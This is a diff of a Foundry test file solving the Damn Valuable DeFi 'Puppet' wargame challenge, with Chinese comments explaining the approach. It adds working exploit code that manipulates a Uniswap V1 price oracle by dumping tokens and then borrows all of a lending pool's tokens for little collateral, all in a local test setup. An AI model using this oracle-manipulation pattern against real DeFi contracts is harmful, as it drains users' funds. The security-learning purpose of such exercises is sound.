@@ -6,7 +6,7 @@ import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {PuppetPool} from "../../../src/Contracts/puppet/PuppetPool.sol";
-
+import "forge-std/console.sol";
 interface UniswapV1Exchange {
     function addLiquidity(
         uint256 min_liquidity,
@@ -45,7 +45,7 @@ contract Puppet is Test {
     uint256 internal constant DEADLINE = 10_000_000;
 
     UniswapV1Exchange internal uniswapV1ExchangeTemplate;
-    UniswapV1Exchange internal uniswapExchange;
+    UniswapV1Exchange internal uniswapExchange; // ETH-DVT pair
     UniswapV1Factory internal uniswapV1Factory;
 
     DamnValuableToken internal dvt;
@@ -65,6 +65,7 @@ contract Puppet is Test {
         vm.label(address(dvt), "DVT");
 
         uniswapV1Factory = UniswapV1Factory(
+            // 这里这个参数是artifacts,内含abi和creationcode
             deployCode("./src/build-uniswap/v1/UniswapV1Factory.json")
         );
 
@@ -111,17 +112,36 @@ contract Puppet is Test {
         // Ensure correct setup of pool.
         assertEq(
             puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
-            POOL_INITIAL_TOKEN_BALANCE * 2
+            POOL_INITIAL_TOKEN_BALANCE * 2 // 因为uniswap池中DVT和ETH的比例是1:1,因此1dvt=1ETH
         );
 
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
-    function testExploit() public {
+    // 应该是个典型的预言机价格操纵攻击
+    // 首先将uniswap池中的dvt价格拉低(在uniswap上进行dvt to ETH的倾销)
+    // 然后用这个低的价格把puppet池中的币全部borrow走
+    function testExploitPUPPET() public {
         /** EXPLOIT START **/
-
+        vm.startPrank(attacker);
+        // 倾销
+        dvt.approve(address(uniswapExchange),ATTACKER_INITIAL_TOKEN_BALANCE);
+        uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 0.1 ether, DEADLINE);
+        console.log("attacker balance",attacker.balance/1e18);
+        console.log("empty puppet needed eth:",puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)/1e18*2);
+        // puppetPool.borrow{value:30}(POOL_INITIAL_TOKEN_BALANCE);
+        uint256 _1ethToToken=_1ethCanGotToken();
+        console.log("1 eth can buy token:",_1ethToToken/1e18);
+        console.log("attacker dvt balance:",dvt.balanceOf(attacker)/1e18);
+        puppetPool.borrow{value:20 ether}(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("attacker balance",attacker.balance/1e18);
+        console.log("attacker dvt balance:",dvt.balanceOf(attacker)/1e18);
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
+    }
+    function _1ethCanGotToken() private returns(uint256) {
+        return (dvt.balanceOf(address(uniswapExchange)) * (10**18) / address(uniswapExchange).balance );
     }
 
     function validation() internal {
